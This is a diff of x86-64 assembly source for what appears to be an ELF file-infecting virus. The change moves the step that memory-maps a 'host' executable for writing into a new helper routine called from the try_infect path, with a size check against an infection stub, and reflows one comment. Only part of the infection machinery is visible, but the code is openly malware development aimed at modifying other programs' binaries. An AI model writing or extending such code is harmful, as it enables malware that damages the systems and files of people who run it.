@@ -151,8 +151,7 @@ struc	dirent
     .d_ino:			resq	1
     .d_off:			resq	1
     .d_reclen		resw	1
-    ; char d_name[] - flexible array member, size can
-    ; be calculated from d_reclen
+    ; char d_name[] - flexible array member, size can be calculated from d_reclen
     .d_name			resb	1
     ; pad
     ; d_type (dirent + d_reclen - 1)
@@ -290,15 +289,7 @@ try_infect:
     cmp rsi, Elf64_Ehdr_size + Elf64_Phdr_size + STUB_SIZE
     jl .close
 
-    xor r9, r9
-    mov r8, data(host_fd)
-    mov r10, MAP_SHARED
-    mov rdx, PROT_READ | PROT_WRITE
-    xor rdi, rdi
-    mov rax, SYS_MMAP
-    syscall
-    cmp rax, MAP_ERROR
-    jae .close
+    call map_host
     mov data(host_bytes), rax
     mov rdi, rax
 
@@ -401,6 +392,24 @@ do_infect:
         pop r14
         pop r13
         ret
+
+; void *map_host(rdi=callback*)
+map_host:
+    push rdi
+    xor r9, r9
+    mov r8, data(host_fd)
+    mov r10, MAP_SHARED
+    mov rdx, PROT_READ | PROT_WRITE
+    xor rdi, rdi
+    mov rax, SYS_MMAP
+    syscall
+
+    pop rdi
+    cmp rax, MAP_ERROR
+    jae .error
+    ret
+    .error:
+        jmp rdi
 
 ; void *get_base_address()
 ; Gets the base address of the running process.
